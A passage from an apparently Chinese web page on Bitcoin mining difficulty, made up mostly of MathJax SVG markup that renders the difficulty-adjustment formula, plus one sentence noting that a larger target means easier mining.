320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(1781,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(2225,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(6783.8,0)\"><path data-c=\"D7\" d=\"M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(7784,0)\"><g data-mml-node=\"mtext\" transform=\"translate(789,676)\"><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\"/><path data-c=\"63\" d=\"M370 305T349 305T313 320T297 358Q297 381 312 396Q317 401 317 402T307 404Q281 408 258 408Q209 408 178 376Q131 329 131 219Q131 137 162 90Q203 29 272 29Q313 29 338 55T374 117Q376 125 379 127T395 129H409Q415 123 415 120Q415 116 411 104T395 71T366 33T318 2T249 -11Q163 -11 99 53T34 214Q34 318 99 383T250 448T370 421T404 357Q404 334 387 320Z\" transform=\"translate(500,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(944,0)\"/><path data-c=\"75\" d=\"M383 58Q327 -10 256 -10H249Q124 -10 105 89Q104 96 103 226Q102 335 102 348T96 369Q86 385 36 385H25V408Q25 431 27 431L38 432Q48 433 67 434T105 436Q122 437 142 438T172 441T184 442H187V261Q188 77 190 64Q193 49 204 40Q224 26 264 26Q290 26 311 35T343 58T363 90T375 120T379 144Q379 145 379 161T380 201T380 248V315Q380 361 370 372T320 385H302V431Q304 431 378 436T457 442H464V264Q464 84 465 81Q468 61 479 55T524 46H542V0Q540 0 467 -5T390 -11H383V58Z\" transform=\"translate(1333,0)\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(1889,0)\"/><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\" transform=\"translate(2389,0)\"/><path data-c=\"20\" d=\"\" transform=\"translate(2667,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(2917,0)\"/><path data-c=\"69\" d=\"M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z\" transform=\"translate(3306,0)\"/><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\" transform=\"translate(3584,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(4417,0)\"/></g><g data-mml-node=\"mtext\" transform=\"translate(220,-686)\"><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\"/><path data-c=\"78\" d=\"M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z\" transform=\"translate(444,0)\"/><path data-c=\"70\" d=\"M36 -148H50Q89 -148 97 -134V-126Q97 -119 97 -107T97 -77T98 -38T98 6T98 55T98 106Q98 140 98 177T98 243T98 296T97 335T97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 61 434T98 436Q115 437 135 438T165 441T176 442H179V416L180 390L188 397Q247 441 326 441Q407 441 464 377T522 216Q522 115 457 52T310 -11Q242 -11 190 33L182 40V-45V-101Q182 -128 184 -134T195 -145Q216 -148 244 -148H260V-194H252L228 -193Q205 -192 178 -192T140 -191Q37 -191 28 -194H20V-148H36ZM424 218Q424 292 390 347T305 402Q234 402 182 337V98Q222 26 294 26Q345 26 384 80T424 218Z\" transform=\"translate(972,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(1528,0)\"/><path data-c=\"63\" d=\"M370 305T349 305T313 320T297 358Q297 381 312 396Q317 401 317 402T307 404Q281 408 258 408Q209 408 178 376Q131 329 131 219Q131 137 162 90Q203 29 272 29Q313 29 338 55T374 117Q376 125 379 127T395 129H409Q415 123 415 120Q415 116 411 104T395 71T366 33T318 2T249 -11Q163 -11 99 53T34 214Q34 318 99 383T250 448T370 421T404 357Q404 334 387 320Z\" transform=\"translate(1972,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(2416,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(2805,0)\"/><path data-c=\"64\" d=\"M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z\" transform=\"translate(3249,0)\"/><path data-c=\"20\" d=\"\" transform=\"translate(3805,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(4055,0)\"/><path data-c=\"69\" d=\"M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z\" transform=\"translate(4444,0)\"/><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\" transform=\"translate(4722,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(5555,0)\"/></g><rect width=\"6199\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mspace\" transform=\"translate(14223,0)\"/><g data-mml-node=\"mtext\" transform=\"translate(14223,0)\"><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\"/><path data-c=\"78\" d=\"M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z\" transform=\"translate(444,0)\"/><path data-c=\"70\" d=\"M36 -148H50Q89 -148 97 -134V-126Q97 -119 97 -107T97 -77T98 -38T98 6T98 55T98 106Q98 140 98 177T98 243T98 296T97 335T97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 61 434T98 436Q115 437 135 438T165 441T176 442H179V416L180 390L188 397Q247 441 326 441Q407 441 464 377T522 216Q522 115 457 52T310 -11Q242 -11 190 33L182 40V-45V-101Q182 -128 184 -134T195 -145Q216 -148 244 -148H260V-194H252L228 -193Q205 -192 178 -192T140 -191Q37 -191 28 -194H20V-148H36ZM424 218Q424 292 390 347T305 402Q234 402 182 337V98Q222 26 294 26Q345 26 384 80T424 218Z\" transform=\"translate(972,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(1528,0)\"/><path data-c=\"63\" d=\"M370 305T349 305T313 320T297 358Q297 381 312 396Q317 401 317 402T307 404Q281 408 258 408Q209 408 178 376Q131 329 131 219Q131 137 162 90Q203 29 272 29Q313 29 338 55T374 117Q376 125 379 127T395 129H409Q415 123 415 120Q415 116 411 104T395 71T366 33T318 2T249 -11Q163 -11 99 53T34 214Q34 318 99 383T250 448T370 421T404 357Q404 334 387 320Z\" transform=\"translate(1972,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(2416,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(2805,0)\"/><path data-c=\"64\" d=\"M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z\" transform=\"translate(3249,0)\"/><path data-c=\"20\" d=\"\" transform=\"translate(3805,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(4055,0)\"/><path data-c=\"69\" d=\"M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z\" transform=\"translate(4444,0)\"/><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\" transform=\"translate(4722,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(5555,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(20499.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(21555.6,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\" transform=\"translate(500,0)\"/><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\" transform=\"translate(1000,0)\"/><path data-c=\"36\" d=\"M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z\" transform=\"translate(1500,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(23777.8,0)\"><path data-c=\"D7\" d=\"M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(24778,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\" transform=\"translate(500,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(25944.7,0)\"><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\"/><path data-c=\"69\" d=\"M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z\" transform=\"translate(833,0)\"/><path data-c=\"6E\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\" transform=\"translate(1111,0)\"/></g></g></g></svg></mjx-container></span></p>\n<p>target 越大，挖矿难度越小。</p>\n<p>另外，<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -1.091ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"10.593ex\" height=\"3.093ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -884.7 4681.9 1366.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mtext\" transform=\"translate(622.3,394) scale(0.707)\"><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\"/><path data-c=\"63\" d=\"M370 305T349 305T313 320T297 358Q297 381 312 396Q317 401 317 402T307 404Q281 408 258 408Q209 408 178 376Q131 329 131 219Q131 137 162 90Q203 29 272 29Q313 29 338 55T374 117Q376 125 379 127T395 129H409Q415 123 415 120Q415 116 411 104T395 71T366 33T318 2T249 -11Q163 -11 99 53T34 214Q34 318 99 383T250 448T370 421T404 357Q404 334 387 320Z\" transform=\"translate(500,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 